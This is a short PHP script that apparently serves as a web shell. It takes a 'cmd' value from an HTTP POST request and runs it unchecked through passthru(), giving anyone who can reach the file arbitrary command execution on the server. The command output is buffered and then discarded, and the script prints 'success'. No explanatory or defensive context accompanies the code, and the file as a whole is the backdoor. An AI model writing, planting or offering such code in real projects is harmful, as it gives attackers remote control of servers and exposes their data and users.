<?php
function execute($com)
{
    echo passthru($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
echo "success";
$buffer = ob_get_contents();
ob_end_clean();
?>